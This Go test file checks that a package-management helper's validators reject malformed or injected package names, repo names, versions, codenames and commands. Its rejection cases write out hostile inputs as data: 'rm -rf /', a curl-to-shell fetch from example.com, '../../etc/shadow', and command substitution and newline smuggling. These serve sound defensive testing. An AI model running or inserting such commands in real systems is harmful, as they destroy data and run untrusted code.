package hostpkg

import (
	"errors"
	"strings"
	"testing"
)

func TestValidatePackageNameRejectsInjection(t *testing.T) {
	cases := []string{
		"nginx; rm -rf /",
		"nginx && curl https://example.com | sh",
		"nginx redis",
		"../../etc/shadow",
		"../nginx",
		"nginx$(id)",
		"nginx`id`",
		"nginx|tee",
		"nginx\nredis",
		"nginx\x00",
		"-y",
		"--allow-downgrades",
		"",
		strings.Repeat("a", maxPackageNameLen+1),
	}

	for _, name := range cases {
		t.Run(name, func(t *testing.T) {
			if err := ValidatePackageName(name); !errors.Is(err, ErrInvalidPackageName) {
				t.Fatalf("ValidatePackageName(%q) = %v, want ErrInvalidPackageName", name, err)
			}
		})
	}
}

func TestValidatePackageNameAccepts(t *testing.T) {
	for _, name := range []string{"nginx", "php8.3-fpm", "docker-ce", "lib32-glibc", "postgresql16-server"} {
		if err := ValidatePackageName(name); err != nil {
			t.Errorf("ValidatePackageName(%q) = %v, want nil", name, err)
		}
	}
}

func TestValidatePackageNamesRejectsEmptySet(t *testing.T) {
	if err := ValidatePackageNames(nil); !errors.Is(err, ErrNoPackages) {
		t.Fatalf("error = %v, want ErrNoPackages", err)
	}
	if err := ValidatePackageNames([]string{"nginx", "bad name"}); !errors.Is(err, ErrInvalidPackageName) {
		t.Fatalf("error = %v, want ErrInvalidPackageName", err)
	}
}

func TestValidateRepoName(t *testing.T) {
	for _, name := range []string{"docker", "sury-php", "remi-safe"} {
		if err := ValidateRepoName(name); err != nil {
			t.Errorf("ValidateRepoName(%q) = %v, want nil", name, err)
		}
	}
	for _, name := range []string{"", "Docker", "../docker", "docker repo", "docker;rm", strings.Repeat("d", maxRepoNameLen+1)} {
		if err := ValidateRepoName(name); !errors.Is(err, ErrInvalidRepoName) {
			t.Errorf("ValidateRepoName(%q) = %v, want ErrInvalidRepoName", name, err)
		}
	}
}

func TestValidatePHPVersion(t *testing.T) {
	for _, v := range []string{"8.3", "8.4", "7.4"} {
		if err := ValidatePHPVersion(v); err != nil {
			t.Errorf("ValidatePHPVersion(%q) = %v, want nil", v, err)
		}
	}
	for _, v := range []string{"", "8", "8.3.1", "8.x", "8.3;rm", "../8.3"} {
		if err := ValidatePHPVersion(v); !errors.Is(err, ErrInvalidVersion) {
			t.Errorf("ValidatePHPVersion(%q) = %v, want ErrInvalidVersion", v, err)
		}
	}
}

func TestValidateCodename(t *testing.T) {
	if err := ValidateCodename("bookworm"); err != nil {
		t.Errorf("ValidateCodename(bookworm) = %v, want nil", err)
	}
	for _, c := range []string{"", "Bookworm", "book worm", "book/worm", "../bookworm"} {
		if err := ValidateCodename(c); !errors.Is(err, ErrInvalidVersion) {
			t.Errorf("ValidateCodename(%q) = %v, want ErrInvalidVersion", c, err)
		}
	}
}

func TestDedupePackages(t *testing.T) {
	got := DedupePackages([]string{"nginx", "redis", "nginx", "redis", "php"})
	want := []string{"nginx", "redis", "php"}
	if strings.Join(got, ",") != strings.Join(want, ",") {
		t.Fatalf("DedupePackages = %v, want %v", got, want)
	}
}

func TestValidateCommandRejectsShellAndPaths(t *testing.T) {
	cases := []Command{
		{Name: "/bin/sh"},
		{Name: "apt get"},
		{Name: "APT"},
		{Name: "apt-get;rm"},
		{Name: "apt-get", Args: []string{""}},
		{Name: "apt-get", Args: []string{"install\nnginx"}},
		{Name: "apt-get", Env: []string{"NOT_A_PAIR"}},
		{Name: "apt-get", Env: []string{"KEY=value\ninjected=1"}},
	}

	for _, cmd := range cases {
		if err := validateCommand(cmd); !errors.Is(err, ErrInvalidCommand) {
			t.Errorf("validateCommand(%q) = %v, want ErrInvalidCommand", CommandLine(cmd), err)
		}
	}

	if err := validateCommand(Command{Name: "apt-get", Args: []string{"install", "-y", "nginx"}}); err != nil {
		t.Fatalf("valid command rejected: %v", err)
	}
}

func TestFakeRunnerRejectsInvalidCommand(t *testing.T) {
	runner := NewFakeRunner()
	if _, err := runner.Run(t.Context(), Command{Name: "apt-get", Args: []string{"install", "nginx; rm -rf /\n"}}); !errors.Is(err, ErrInvalidCommand) {
		t.Fatalf("error = %v, want ErrInvalidCommand", err)
	}
	if len(runner.Calls) != 0 {
		t.Fatalf("an invalid command was recorded: %v", runner.Lines())
	}
}

func TestTruncateOutput(t *testing.T) {
	if got := truncateOutput("short"); got != "short" {
		t.Fatalf("truncateOutput = %q", got)
	}
	long := strings.Repeat("x", maxCapturedOutput+64)
	if got := truncateOutput(long); len(got) != maxCapturedOutput {
		t.Fatalf("len(truncateOutput) = %d, want %d", len(got), maxCapturedOutput)
	}
}
